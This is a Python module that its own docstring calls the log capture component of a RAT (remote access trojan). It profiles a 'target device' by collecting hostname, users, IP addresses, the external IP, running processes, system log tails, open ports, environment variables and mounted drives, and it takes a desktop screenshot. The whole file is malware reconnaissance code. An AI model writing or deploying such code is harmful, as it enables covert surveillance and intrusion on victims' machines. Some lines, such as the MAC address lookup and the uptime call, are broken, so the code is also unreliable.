"""
RAT Log Capture Module
Captures system logs, events, and information from the target device
"""

import os
import sys
import subprocess
import platform
import socket
import pwd
import getpass
from datetime import datetime
from .config import Config

class LogCapture:
    """Captures system logs and information"""
    
    def __init__(self, config=None):
        self.config = config or Config()
        
    def capture(self):
        """Capture all system logs and information"""
        logs = []
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        logs.append("=" * 60)
        logs.append(f"System Log Report - {timestamp}")
        logs.append("=" * 60)
        logs.append("")
        
        # System Information
        logs.append("--- System Information ---")
        self._capture_system_info(logs)
        logs.append("")
        
        # Network Information
        logs.append("--- Network Information ---")
        self._capture_network_info(logs)
        logs.append("")
        
        # User Information
        logs.append("--- User Information ---")
        self._capture_user_info(logs)
        logs.append("")
        
        # Running Processes
        logs.append("--- Running Processes ---")
        self._capture_processes(logs)
        logs.append("")
        
        # System Logs
        logs.append("--- Recent System Logs ---")
        self._capture_system_logs(logs)
        logs.append("")
        
        # Connected Users
        logs.append("--- Connected Users ---")
        self._capture_connected_users(logs)
        logs.append("")
        
        # Open Ports
        logs.append("--- Open Ports ---")
        self._capture_open_ports(logs)
        logs.append("")
        
        # Environment Variables
        logs.append("--- Environment Variables ---")
        self._capture_environment(logs)
        logs.append("")
        
        # Mounted Drives
        logs.append("--- Mounted Drives ---")
        self._capture_mounted_drives(logs)
        logs.append("")
        
        return "\n".join(logs)
    
    def _capture_system_info(self, logs):
        """Capture system information"""
        try:
            logs.append(f"Hostname: {socket.gethostname()}")
        except Exception as e:
            logs.append(f"Hostname: Error - {e}")
        
        try:
            logs.append(f"Platform: {platform.system()} {platform.release()}")
        except Exception as e:
            logs.append(f"Platform: Error - {e}")
        
        try:
            logs.append(f"Architecture: {platform.machine()}")
        except Exception as e:
            logs.append(f"Architecture: Error - {e}")
        
        try:
            logs.append(f"Python Version: {platform.python_version()}")
        except Exception as e:
            logs.append(f"Python Version: Error - {e}")
        
        try:
            logs.append(f"Username: {getpass.getuser()}")
        except Exception as e:
            logs.append(f"Username: Error - {e}")
        
        try:
            logs.append(f"Working Directory: {os.getcwd()}")
        except Exception as e:
            logs.append(f"Working Directory: Error - {e}")
    
    def _capture_network_info(self, logs):
        """Capture network information"""
        try:
            # Get all IP addresses
            hostname = socket.gethostname()
            addresses = socket.getaddrinfo(hostname, None)
            ips = set()
            for addr in addresses:
                ips.add(addr[4][0])
            logs.append(f"IP Addresses: {', '.join(ips)}")
        except Exception as e:
            logs.append(f"IP Addresses: Error - {e}")
        
        try:
            # Try to get external IP
            import urllib.request
            external_ip = urllib.request.urlopen('https://ifconfig.me', timeout=5).read().decode().strip()
            logs.append(f"External IP: {external_ip}")
        except Exception as e:
            logs.append(f"External IP: Could not determine")
        
        try:
            logs.append(f"MAC Address: {':'.join(['%02x' % b for b in socket.gethostbyname(socket.gethostname())])}")
        except:
            pass
    
    def _capture_user_info(self, logs):
        """Capture user information"""
        try:
            logs.append(f"Current User: {getpass.getuser()}")
            logs.append(f"UID: {os.getuid()}")
            logs.append(f"GID: {os.getgid()}")
        except Exception as e:
            logs.append(f"User Info: Error - {e}")
        
        try:
            # Get home directory
            logs.append(f"Home Directory: {os.path.expanduser('~')}")
        except Exception as e:
            logs.append(f"Home Directory: Error - {e}")
    
    def _capture_processes(self, logs):
        """Capture running processes"""
        try:
            result = subprocess.run(
                ['ps', 'aux'],
                capture_output=True,
                text=True,
                timeout=10
            )
            # Limit output size
            output = result.stdout[:3000]
            logs.append(output)
        except Exception as e:
            logs.append(f"Process List: Error - {e}")
        
        # Also capture top processes by CPU
        try:
            result = subprocess.run(
                ['ps', 'aux', '--sort=-%cpu', '-h', '-n', '20'],
                capture_output=True,
                text=True,
                timeout=10
            )
            logs.append("\nTop 20 Processes by CPU:")
            logs.append(result.stdout[:2000])
        except Exception as e:
            logs.append(f"Top Processes: Error - {e}")
    
    def _capture_system_logs(self, logs):
        """Capture system log files"""
        log_files = self.config.get_log_files()
        
        for log_file in log_files:
            if os.path.exists(log_file):
                try:
                    logs.append(f"\n--- {log_file} (last 30 lines) ---")
                    result = subprocess.run(
                        ['tail', '-n', '30', log_file],
                        capture_output=True,
                        text=True,
                        timeout=5
                    )
                    logs.append(result.stdout[:1000])
                except Exception as e:
                    logs.append(f"Error reading {log_file}: {e}")
    
    def _capture_connected_users(self, logs):
        """Capture connected users"""
        try:
            result = subprocess.run(
                ['who'],
                capture_output=True,
                text=True,
                timeout=5
            )
            logs.append(result.stdout if result.stdout else "No users logged in")
        except Exception as e:
            logs.append(f"Connected Users: Error - {e}")
        
        try:
            result = subprocess.run(
                ['w'],
                capture_output=True,
                text=True,
                timeout=5
            )
            logs.append("\nUser Activity:")
            logs.append(result.stdout[:1000])
        except Exception as e:
            pass
    
    def _capture_open_ports(self, logs):
        """Capture open ports"""
        try:
            result = subprocess.run(
                ['netstat', '-tuln'],
                capture_output=True,
                text=True,
                timeout=10
            )
            logs.append(result.stdout[:2000])
        except Exception as e:
            # Try ss command as fallback
            try:
                result = subprocess.run(
                    ['ss', '-tuln'],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                logs.append(result.stdout[:2000])
            except Exception as e2:
                logs.append(f"Open Ports: Error - {e}")
    
    def _capture_environment(self, logs):
        """Capture environment variables"""
        try:
            env_vars = {k: v for k, v in os.environ.items() 
                       if not k.startswith('_') and len(k) < 50}
            for key, value in list(env_vars.items())[:30]:
                # Mask sensitive values
                if 'key' in key.lower() or 'pass' in key.lower() or 'secret' in key.lower():
                    value = value[:5] + '...' if len(value) > 5 else '***'
                logs.append(f"{key}={value}")
        except Exception as e:
            logs.append(f"Environment: Error - {e}")
    
    def _capture_mounted_drives(self, logs):
        """Capture mounted drives"""
        try:
            result = subprocess.run(
                ['df', '-h'],
                capture_output=True,
                text=True,
                timeout=10
            )
            logs.append(result.stdout)
        except Exception as e:
            logs.append(f"Mounted Drives: Error - {e}")
    
    def capture_screenshot(self):
        """Capture desktop screenshot if available"""
        screenshot_path = "/tmp/opencode/rat_screenshot.png"
        
        try:
            # Try import (ImageMagick)
            result = subprocess.run(
                ['import', '-window', 'root', screenshot_path],
                capture_output=True,
                timeout=10
            )
            if result.returncode == 0 and os.path.exists(screenshot_path):
                with open(screenshot_path, 'rb') as f:
                    return f.read()
        except Exception:
            pass
        
        try:
            # Try scrot
            result = subprocess.run(
                ['scrot', screenshot_path],
                capture_output=True,
                timeout=10
            )
            if result.returncode == 0 and os.path.exists(screenshot_path):
                with open(screenshot_path, 'rb') as f:
                    return f.read()
        except Exception:
            pass
        
        return None
    
    def get_system_summary(self):
        """Get a brief system summary"""
        summary = {}
        
        try:
            summary['hostname'] = socket.gethostname()
        except:
            summary['hostname'] = 'Unknown'
        
        try:
            summary['platform'] = f"{platform.system()} {platform.release()}"
        except:
            summary['platform'] = 'Unknown'
        
        try:
            summary['username'] = getpass.getuser()
        except:
            summary['username'] = 'Unknown'
        
        try:
            summary['uptime'] = subprocess.check_output(
                ['uptime', '-p'],
                capture_output=True,
                text=True
            ).strip()
        except:
            summary['uptime'] = 'Unknown'
        
        return summary
